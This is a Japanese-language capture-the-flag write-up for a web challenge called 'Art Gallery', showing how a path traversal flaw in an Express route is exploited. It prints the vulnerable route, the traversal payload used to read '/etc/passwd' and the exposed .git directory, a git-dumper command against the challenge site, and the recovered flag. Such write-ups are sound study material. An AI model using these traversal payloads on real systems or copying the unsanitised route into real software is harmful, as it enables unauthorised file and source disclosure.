# [WEB] Art Gallery 100pts
bosh left his [image gallery](https://art-gallery.web.actf.co/) service running.... quick, git all of his secrets before he deletes them!!! [source](https://files.actf.co/402c73bf8676ad4d4a12aac56075d2dc04ead83f5d332cbd3d1cfb568315f789/index.js)

# Solution
指定されたサイトにアクセスしてみる。セレクトボックスがあり、４種類の中から選べる。とりあえず、適当な１つを選び、Submitボタンを押してみる。すると`https://art-gallery.web.actf.co/gallery?member=aplet.jpg` に飛び、画像が表示された。ソースコードを読むと、この処理は

```jsx
app.get("/gallery", (req, res) => {
    res.sendFile(path.join(__dirname, "images", req.query.member), (err) => {
        res.sendFile(path.join(__dirname, "error.html"))
    });
});
```

で行っていることがわかる。 クエリパラメータを任意の値にすることで、非公開のファイルにアクセスできそうなのがわかる。つまり、この問題はパストラバーサル（別名：ディレクトリトラバーサル）を扱った問題だろう。

この手の問題では、初めに脳死で `etc/passwd` にアクセスを試みるらしい（writeup読んだ感じそんな気が）

`etc/passwd`とは、UNIX系オペレーティングシステム(OS)で、符号化されたパスワード
などの情報を格納するために使われていたファイルである。

てことで、アクセスできるような文字列を色々試す。すると、`../../../etc/passwd` でgalleryファイルを入手できた。\
今まで知らなかったが、`images/../../etc/passwd` のようなパスの指定はできる。\
問題文にgitと書いてあるので、gitに関係したファイルを探してみると、`../.git/index` や`../.git/config` でアクセス可能であることが判明。ArtGalleryを構成しているリポジトリを入手したいので、`git-dumper`と呼ばれるwebサイトからgitリポジトリを持ってくることができるツールを使ってみる。

```bash
$ git-dumper https://art-gallery.web.actf.co/gallery?member=../.git art_gallery
```

持ってこれたリポジトリを調べても、フラグが書かれたファイルは見つけられない。そこで、`git log --patch` で差分の内容を含めたログをみることにする。

```bash
commit 1c584170fb33ae17a63e22456f19601efb1f23db (HEAD -> master)
Author: imposter <sus@aplet.me>
Date:   Tue Apr 26 21:47:45 2022 -0400

    bury secrets

commit 713a4aba8af38c9507ced6ea41f602b105ca4101
Author: imposter <sus@aplet.me>
Date:   Tue Apr 26 21:44:48 2022 -0400

    remove vital secrets

diff --git a/flag.txt b/flag.txt
deleted file mode 100644
index 780f864..0000000
--- a/flag.txt
+++ /dev/null
@@ -1 +0,0 @@
-actf{lfi_me_alone_and_git_out_341n4kaf5u59v}

commit 56449caeb7973b88f20d67b4c343cbb895aa6bc7
Author: imposter <sus@aplet.me>
Date:   Tue Apr 26 21:44:01 2022 -0400

    add program

diff --git a/error.html b/error.html
new file mode 100644
index 0000000..8aba39c
--- /dev/null
+++ b/error.html
@@ -0,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>:(</title>
+        <style>
+            h1 {
+                text-align: center;
+            }
+        </style>
+    </head>
+    <body>
+        <h1>
+            bruh go look at pictures of aplet or something
+        </h1>
+    </body>
+</html>
\ No newline at end of file
diff --git a/flag.txt b/flag.txt
new file mode 100644
index 0000000..780f864
--- /dev/null
+++ b/flag.txt
@@ -0,0 +1 @@
```

フラグ発見！

# References
- https://www.youtube.com/watch?v=KVKxcbHwIoY
- https://www.wdic.org/w/TECH//etc/passwd